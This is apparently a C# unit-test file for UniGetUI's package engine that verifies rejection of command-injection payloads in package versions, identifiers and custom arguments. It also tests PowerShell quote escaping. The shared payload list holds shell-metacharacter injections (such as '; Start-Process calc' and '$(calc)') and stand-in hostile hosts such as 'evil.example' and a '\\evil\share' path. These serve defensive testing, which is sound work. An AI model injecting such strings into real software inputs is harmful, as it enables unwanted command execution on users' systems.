using UniGetUI.Core.Tools;
using UniGetUI.PackageEngine.Enums;
using UniGetUI.PackageEngine.Interfaces;
using UniGetUI.PackageEngine.PackageClasses;
using UniGetUI.PackageEngine.Serializable;
using UniGetUI.PackageEngine.Tests.Infrastructure.Builders;
using UniGetUI.PackageEngine.Tests.Infrastructure.Fakes;

namespace UniGetUI.PackageEngine.Tests;

public sealed class CommandInjectionSurfaceTests
{
    private static readonly string[] _shellMetacharacterPayloads =
    [
        "; Start-Process calc",
        "&calc",
        "|calc",
        "$(calc)",
        "`ncalc",
        "\ncalc",
        "\rcalc",
        "\tcalc",
        "'; calc; '",
        "\"; calc",
        " --index-url http://evil.example",
        "${env:PATH}",
        "#comment",
        "%PATH%",
        "!PATH!",
        "(calc)",
        "{calc}",
        "[char]65",
        "<nul",
        ">out",
        @"\\evil\share\p.exe",
    ];

    public static TheoryData<string> ShellMetacharacterPayloads => new(_shellMetacharacterPayloads);

    private static TestPackageManager ShellManager() =>
        new PackageManagerBuilder()
            .WithName("ShellManager")
            .ConfigureManager(manager => manager.SetCommandLineIsShellInterpreted(true))
            .ConfigureOperation(helper =>
                helper.ParametersFactory = (package, options, _) =>
                    options.Version.Length > 0
                        ? ["install", package.Id, "--version", options.Version]
                        : ["install", package.Id]
            )
            .Build();

    private static TestPackageManager DirectExecManager() =>
        new PackageManagerBuilder()
            .WithName("DirectManager")
            .ConfigureOperation(helper =>
                helper.ParametersFactory = (package, options, _) =>
                    options.Version.Length > 0
                        ? ["install", package.Id, "--version", options.Version]
                        : ["install", package.Id]
            )
            .Build();

    private static IPackage PackageOn(
        TestPackageManager manager,
        string id = "safe-package",
        string version = "1.0.0"
    ) => new PackageBuilder().WithManager(manager).WithId(id).WithVersion(version).Build();

    [Fact]
    public void Harness_ManagersUnderTestAreActuallyReady()
    {
        Assert.True(ShellManager().IsReady());
        Assert.True(DirectExecManager().IsReady());
    }

    [Fact]
    public void Harness_ShellManagerServesLegitimateRequestsSoRejectionsAreMeaningful()
    {
        var manager = ShellManager();
        var package = PackageOn(manager, id: "powershell-yaml");
        var options = new InstallOptions { Version = "1.2.3" };

        var parameters = manager.OperationHelper.GetParameters(
            package,
            options,
            OperationType.Install
        );

        Assert.Equal(["install", "powershell-yaml", "--version", "1.2.3"], parameters);
    }

    [Theory]
    [MemberData(nameof(ShellMetacharacterPayloads))]
    public void OperationHelper_RejectsEveryVersionPayload(string payload)
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions { Version = "1.0.0" + payload };

        Assert.Throws<InvalidOperationException>(
            () => manager.OperationHelper.GetParameters(package, options, OperationType.Install)
        );
    }

    [Theory]
    [MemberData(nameof(ShellMetacharacterPayloads))]
    public void OperationHelper_RejectsEveryIdentifierPayload(string payload)
    {
        var manager = ShellManager();
        var package = PackageOn(manager, id: "pkg" + payload);

        Assert.Throws<InvalidOperationException>(
            () =>
                manager.OperationHelper.GetParameters(
                    package,
                    new InstallOptions(),
                    OperationType.Install
                )
        );
    }

    [Theory]
    [InlineData(OperationType.Install)]
    [InlineData(OperationType.Update)]
    [InlineData(OperationType.Uninstall)]
    public void OperationHelper_RejectsIdentifierPayloadOnEveryOperation(OperationType operation)
    {
        var manager = ShellManager();
        var package = PackageOn(manager, id: "pkg; Start-Process calc");

        Assert.Throws<InvalidOperationException>(
            () => manager.OperationHelper.GetParameters(package, new InstallOptions(), operation)
        );
    }

    [Fact]
    public void OperationHelper_RejectsAVersionThatIsOnlyAFlag()
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions { Version = "-Scope" };

        Assert.Throws<InvalidOperationException>(
            () => manager.OperationHelper.GetParameters(package, options, OperationType.Install)
        );
    }

    [Fact]
    public void OperationHelper_RejectsAnIdentifierThatIsOnlyAFlag()
    {
        var manager = ShellManager();
        var package = PackageOn(manager, id: "-Name");

        Assert.Throws<InvalidOperationException>(
            () =>
                manager.OperationHelper.GetParameters(
                    package,
                    new InstallOptions(),
                    OperationType.Install
                )
        );
    }

    [Fact]
    public void OperationHelper_RejectsAnOverlongVersion()
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions
        {
            Version = new string('1', CoreTools.MaxPackageVersionLength + 1),
        };

        Assert.Throws<InvalidOperationException>(
            () => manager.OperationHelper.GetParameters(package, options, OperationType.Install)
        );
    }

    [Theory]
    [InlineData("1.2.3")]
    [InlineData("1.2.3.4")]
    [InlineData("2.0.0-preview1")]
    [InlineData("1.2.3-alpha.1+build.5")]
    [InlineData("1:2.3.4-1ubuntu0.1~esm1")]
    public void OperationHelper_KeepsLegitimateVersionsPinnedOnShellManagers(string version)
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions { Version = version };

        var parameters = manager.OperationHelper.GetParameters(
            package,
            options,
            OperationType.Install
        );

        Assert.Contains(version, parameters);
    }

    [Theory]
    [InlineData("powershell-yaml")]
    [InlineData("@babel/core")]
    [InlineData("main/git")]
    [InlineData("eslint-v9:eslint@^9.x")]
    [InlineData("awscli@2")]
    public void OperationHelper_KeepsLegitimateIdentifiersUsableOnShellManagers(string id)
    {
        var manager = ShellManager();
        var package = PackageOn(manager, id: id);

        var parameters = manager.OperationHelper.GetParameters(
            package,
            new InstallOptions(),
            OperationType.Install
        );

        Assert.Contains(id, parameters);
    }

    [Fact]
    public void OperationHelper_LeavesDirectExecManagersAbleToPinAwkwardVersions()
    {
        var manager = DirectExecManager();
        var package = PackageOn(manager);
        var options = new InstallOptions { Version = "2021 Update" };

        var parameters = manager.OperationHelper.GetParameters(
            package,
            options,
            OperationType.Install
        );

        Assert.Contains("2021 Update", parameters);
    }

    [Theory]
    [InlineData("{e46eca4f-393b-40df-9f49-076faf788d83}")]
    [InlineData(@"MSIX\Contoso.App_1.0_x64__8wekyb3d8bbwe")]
    public void OperationHelper_LeavesDirectExecManagersAbleToUseAwkwardIdentifiers(string id)
    {
        var manager = DirectExecManager();
        var package = PackageOn(manager, id: id);

        var parameters = manager.OperationHelper.GetParameters(
            package,
            new InstallOptions(),
            OperationType.Install
        );

        Assert.Contains(id, parameters);
    }

    [Theory]
    [InlineData("$(Start-Process calc)")]
    [InlineData("(Start-Process calc)")]
    [InlineData("`nStart-Process calc")]
    [InlineData("--flag;calc")]
    [InlineData("--flag&calc")]
    public void OperationHelper_RejectsACustomArgumentOnTheConcatenatedShellPath(string argument)
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions { CustomParameters_Install = [argument] };

        Assert.Throws<InvalidOperationException>(
            () => manager.OperationHelper.GetParameters(package, options, OperationType.Install)
        );
    }

    [Fact]
    public void OperationHelper_RejectsACustomUninstallArgumentOnTheConcatenatedShellPath()
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions
        {
            CustomParameters_Uninstall = ["$(Start-Process calc)"],
        };

        Assert.Throws<InvalidOperationException>(
            () => manager.OperationHelper.GetParameters(package, options, OperationType.Uninstall)
        );
    }

    [Fact]
    public void OperationHelper_KeepsAnOrdinaryCustomArgumentOnTheConcatenatedShellPath()
    {
        var manager = ShellManager();
        var package = PackageOn(manager);
        var options = new InstallOptions
        {
            CustomParameters_Install = ["-Force", "--registry=https://registry.example/"],
        };

        Assert.NotEmpty(
            manager.OperationHelper.GetParameters(package, options, OperationType.Install)
        );
    }

    // With an argument vector the custom arguments stay separate arguments, so they are data and
    // need no restriction; the exported script joins them whatever the manager does.
    [Fact]
    public void OperationHelper_AllowsACustomArgumentWhenTheManagerUsesAnArgumentVector()
    {
        var manager = ShellManager();
        manager.SetOperationCallArgs("-NoProfile", "-File", "launcher.ps1");
        var package = PackageOn(manager);
        var options = new InstallOptions { CustomParameters_Install = ["$(Get-Date)"] };

        Assert.NotEmpty(
            manager.OperationHelper.GetParameters(package, options, OperationType.Install)
        );
    }

    [Fact]
    public void OperationHelper_RejectsACustomArgumentForTheExportedScriptDespiteTheVector()
    {
        var manager = ShellManager();
        manager.SetOperationCallArgs("-NoProfile", "-File", "launcher.ps1");
        var package = PackageOn(manager);
        var options = new InstallOptions { CustomParameters_Install = ["$(Start-Process calc)"] };

        Assert.Throws<InvalidOperationException>(
            () =>
                manager.OperationHelper.GetStandaloneParameters(
                    package,
                    options,
                    OperationType.Install
                )
        );
    }

    [Theory]
    [MemberData(nameof(ShellMetacharacterPayloads))]
    public void DetailsHelper_NeverReachesTheUnsafeVersionLookupForAPayloadIdentifier(
        string payload
    )
    {
        bool reached = false;
        var manager = ShellManager();
        manager.TestDetailsHelper.VersionsFactory = _ =>
        {
            reached = true;
            return ["1.0.0"];
        };
        var package = PackageOn(manager, id: "pkg" + payload);

        var versions = manager.DetailsHelper.GetVersions(package);

        Assert.False(reached);
        Assert.Empty(versions);
    }

    [Fact]
    public void DetailsHelper_NeverReachesTheUnsafeDetailsLookupForAPayloadIdentifier()
    {
        bool reached = false;
        var manager = ShellManager();
        manager.TestDetailsHelper.PopulateDetails = _ => reached = true;
        var package = PackageOn(manager, id: "pkg; Start-Process calc");

        manager.DetailsHelper.GetDetails(new PackageDetails(package));

        Assert.False(reached);
    }

    [Fact]
    public void DetailsHelper_NeverReachesTheUnsafeIconLookupForAPayloadIdentifier()
    {
        bool reached = false;
        var manager = ShellManager();
        manager.TestDetailsHelper.IconFactory = _ =>
        {
            reached = true;
            return null;
        };
        var package = PackageOn(manager, id: "pkg$(calc)");

        manager.DetailsHelper.GetIcon(package);

        Assert.False(reached);
    }

    [Fact]
    public void DetailsHelper_NeverReachesTheUnsafeInstallLocationLookupForAPayloadIdentifier()
    {
        bool reached = false;
        var manager = ShellManager();
        manager.TestDetailsHelper.InstallLocationFactory = _ =>
        {
            reached = true;
            return null;
        };
        var package = PackageOn(manager, id: "pkg`ncalc");

        manager.DetailsHelper.GetInstallLocation(package);

        Assert.False(reached);
    }

    [Fact]
    public void DetailsHelper_NeverReachesTheUnsafeScreenshotLookupForAPayloadIdentifier()
    {
        bool reached = false;
        var manager = ShellManager();
        manager.TestDetailsHelper.ScreenshotsFactory = _ =>
        {
            reached = true;
            return [];
        };
        var package = PackageOn(manager, id: "pkg; calc");

        manager.DetailsHelper.GetScreenshots(package);

        Assert.False(reached);
    }

    [Fact]
    public void DetailsHelper_StillServesLegitimateIdentifiersOnShellManagers()
    {
        var manager = ShellManager();
        manager.TestDetailsHelper.VersionsFactory = _ => ["1.0.0", "1.0.1"];
        var package = PackageOn(manager, id: "@babel/core");

        Assert.Equal(["1.0.0", "1.0.1"], manager.DetailsHelper.GetVersions(package));
    }

    [Fact]
    public void DetailsHelper_StillServesAwkwardIdentifiersOnDirectExecManagers()
    {
        var manager = DirectExecManager();
        manager.TestDetailsHelper.VersionsFactory = _ => ["1.0.0"];
        var package = PackageOn(manager, id: @"MSIX\Contoso.App_1.0_x64__8wekyb3d8bbwe");

        Assert.Equal(["1.0.0"], manager.DetailsHelper.GetVersions(package));
    }

    [Theory]
    [InlineData("express", "'express'")]
    [InlineData("multi word query", "'multi word query'")]
    [InlineData("$(calc)", "'$(calc)'")]
    [InlineData("a'; calc; '", "'a''; calc; '''")]
    [InlineData("a\"b", "'ab'")]
    [InlineData("a\nb", "'ab'")]
    public void EscapePowerShellSingleQuoted_NeutralizesSearchQueries(
        string query,
        string expected
    )
    {
        Assert.Equal(expected, CoreTools.EscapePowerShellSingleQuoted(query));
    }

    [Fact]
    public void EscapePowerShellSingleQuoted_OutputCannotBeEscapedFrom()
    {
        foreach (string payload in _shellMetacharacterPayloads)
        {
            string escaped = CoreTools.EscapePowerShellSingleQuoted("express" + payload);

            Assert.StartsWith("'", escaped);
            Assert.EndsWith("'", escaped);
            Assert.DoesNotContain("\"", escaped);
            Assert.DoesNotContain("\n", escaped);
            Assert.DoesNotContain("\r", escaped);
            Assert.Equal(0, escaped[1..^1].Count(character => character == '\'') % 2);
        }
    }
}
